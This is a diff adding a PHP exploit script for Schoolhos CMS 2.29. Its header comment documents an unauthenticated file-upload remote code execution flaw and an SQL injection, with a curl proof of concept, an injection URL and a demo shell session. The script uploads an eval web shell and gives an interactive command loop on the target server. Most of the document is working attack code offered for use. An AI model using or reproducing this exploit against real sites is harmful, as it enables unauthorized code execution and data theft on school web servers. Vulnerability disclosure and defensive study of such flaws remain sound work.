@@ -1,0 +1,165 @@
+<?php
+/*
+Software : Schoolhos CMS 2.29
+Home : http://www.schoolhos.com/
+Author : Ahmed sultan (0x4148)
+Email : 0x4148@gmail.com
+Home : 0x4148.com
+
+Intro
+Schoolhos CMS is alternative to developing School Website. It's Free and Open Source under GPL License. Easy to install, user friendly and elegant design.
+
+Schoolhos is vulnerable to unauthenticated remote code execution vulnerability , Unauthenticated sql injection flaws
+
+I - Remote code execution
+	File : process.php
+	Line : 42
+	elseif ($pilih=='guru' AND $untukdi=='upload'){
+	$lokasi_file = $_FILES['fupload']['tmp_name'];
+	$nama_file   = $_FILES['fupload']['name'];
+		UploadMateri($nama_file);
+	
+	File : file_uplaod.php
+	Line : 9
+	function UploadMateri($fupload_name){
+	  //direktori file dari halaman e-elarning
+	  $vdir_upload = "../file/materi/";
+	  $vfile_upload = $vdir_upload . $fupload_name;
+
+	  move_uploaded_file($_FILES["fupload"]["tmp_name"], $vfile_upload);
+	}
+	
+	POC
+	curl -i -s -k  -X 'POST' \
+    -H 'Content-Type: multipart/form-data; boundary=---------------------------26518470919255' \
+    --data-binary $'-----------------------------26518470919255\x0d\x0aContent-Disposition: form-data; name=\"fupload\"; filename=\"0x4148.php\"\x0d\x0aContent-Type: application/x-httpd-php\x0d\x0a\x0d\x0a<?php die(\"0x4148 rule\"); ?>\x0d\x0a-----------------------------26518470919255\x0d\x0a\x0d\x0a' \
+    'http://HOST/PATH/elearningku/proses.php?pilih=guru&untukdi=upload'
+	
+	php file can be ccessed via : http://HOST/PATH/file/materi/0x4148.php
+
+II - Unauthenticated sql injection
+
+	File : elearningku/download.php
+	Line 6
+	$file=mysql_query("SELECT * FROM sh_materi WHERE id_materi='$_GET[id]'");
+	$r=mysql_fetch_array($file);
+	$filename=$r[file_materi];
+
+	  header("Content-Type: octet/stream");
+	  header("Pragma: private"); 
+	  header("Expires: 0");
+	  header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+	  header("Cache-Control: private",false); 
+	  header("Content-Type: $ctype");
+	  header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
+	  header("Content-Transfer-Encoding: binary");
+	  header("Content-Length: ".filesize($dir.$filename));
+	  readfile("$dir$filename");
+
+	POC : versi_2.29/elearningku/download.php?id=-1' union select 1,version(),3,4,5,6,7,8-- -
+	DB version will be showed as filename
+
+Script is really full of injection flaws , mentioning all of it is such waste of time
+
+Full exploitation Demo
+~0x4148fo# php scho.php http://192.168.0.50/lab/scho/versi_2.29/
+[*] Schoolhos CMS 2.29 Remote command execution
+[*] Author : Ahmed sultan (0x4148)
+[*] Connect : 0x4148.com | 0x4148@gmail.com
+
+ + Sending payload to http://192.168.0.50/lab/scho/versi_2.29/
+ + Payload sent successfully
+
+0x4148@http://192.168.0.50/lab/scho/versi_2.29/# dir
+ Volume in drive C is OS_Install
+ Volume Serial Number is D60F-0795
+
+ Directory of C:\xampp\htdocs\lab\scho\versi_2.29\file\materi
+
+11/13/2016  02:03 AM    <DIR>          .
+11/13/2016  02:03 AM    <DIR>          ..
+11/13/2016  02:03 AM                47 0x4148.php
+11/30/2011  06:56 PM             8,522 aku.php
+11/29/2011  02:02 AM                74 Alar Reproduksi.rar
+11/29/2011  02:03 AM                74 albert.rar
+11/29/2011  08:25 PM            12,326 ari.png
+11/29/2011  08:27 PM            12,318 ari.rar
+11/29/2011  06:57 PM                74 cerita.rar
+11/29/2011  08:24 PM                 0 contoh.txt
+11/29/2011  02:05 AM                74 dos.rar
+11/29/2011  02:01 AM                74 English1.rar
+12/12/2011  11:13 AM               117 index.html
+11/29/2011  02:10 AM                74 kekebalantubuh.rar
+11/29/2011  02:11 AM                74 masa jenis.rar
+11/29/2011  02:14 AM                74 office.rar
+11/29/2011  02:06 AM                74 paragraf.rar
+11/29/2011  02:04 AM                74 pemanasan.rar
+11/29/2011  02:00 AM                74 polakalimat.rar
+11/29/2011  02:15 AM                74 prepare.rar
+11/29/2011  02:13 AM                74 proklamator.rar
+11/29/2011  02:12 AM                74 sea games.rar
+11/29/2011  02:05 AM                74 soekarno.rar
+11/29/2011  02:09 AM                74 speaking.rar
+11/29/2011  02:15 AM                74 ulangan INDO.rar
+11/29/2011  02:11 AM                74 volume.rar
+              24 File(s)         34,662 bytes
+               2 Dir(s)  38,197,485,568 bytes free
+
+0x4148@http://192.168.0.50/lab/scho/versi_2.29/# exit
+
+~0x4148fo#
+
+*/
+$host=$argv[1];
+$target="$host/elearningku/proses.php?pilih=guru&untukdi=upload";
+echo "[*] Schoolhos CMS 2.29 Remote command execution\n";
+echo "[*] Author : Ahmed sultan (0x4148)\n";
+echo "[*] Connect : 0x4148.com | 0x4148@gmail.com\n\n";
+echo " + Sending payload to $host\n";
+fwrite(fopen("0x4148.php","w+"),'<?php eval(base64_decode($_POST["0x4148"])); ?>');
+$x4148upload = curl_init(); 
+curl_setopt($x4148upload, CURLOPT_URL, $target);
+curl_setopt($x4148upload, CURLOPT_USERAGENT, "mozilla");
+curl_setopt($x4148upload, CURLOPT_POST, 1);
+curl_setopt($x4148upload, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($x4148upload, CURLOPT_POSTFIELDS,array("fupload"=>"@".realpath("0x4148.php")));
+curl_setopt($x4148upload, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($x4148upload, CURLOPT_SSL_VERIFYHOST, 0);
+$result = curl_exec($x4148upload);
+curl_close($x4148upload);
+$x4148request=curl_init();
+curl_setopt($x4148request,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($x4148request,CURLOPT_URL,$host."/file/materi/0x4148.php");
+curl_setopt($x4148request, CURLOPT_POSTFIELDS,"0x4148=".base64_encode("echo '0x4148fo';"));
+curl_setopt($x4148request, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($x4148request, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($x4148request,CURLOPT_FOLLOWLOCATION,0);
+curl_setopt($x4148request,CURLOPT_TIMEOUT,20);
+curl_setopt($x4148request, CURLOPT_HEADER, true); 
+$outp=curl_exec($x4148request);
+curl_close($x4148request);
+if(!preg_match("#0x4148fo#",$outp)){
+echo " - Failed :(\n";
+die();
+}
+echo " + Payload sent successfully\n\n";
+while(0<1){
+echo "0x4148@$host# ";
+$command=trim(fgets(STDIN));
+if($command=='exit'){
+die();
+}
+$x4148request=curl_init();
+curl_setopt($x4148request,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($x4148request,CURLOPT_URL,$host."/file/materi/0x4148.php");
+curl_setopt($x4148request, CURLOPT_POSTFIELDS,"0x4148=".urlencode(base64_encode("echo '>>>>>';system('$command');echo '>>>>>';")));
+curl_setopt($x4148request, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($x4148request, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($x4148request,CURLOPT_FOLLOWLOCATION,0);
+curl_setopt($x4148request,CURLOPT_TIMEOUT,20);
+curl_setopt($x4148request, CURLOPT_HEADER, true); 
+$outp=curl_exec($x4148request);
+curl_close($x4148request);
+echo explode(">>>>>",$outp)[1]."\n";
+}
+?>
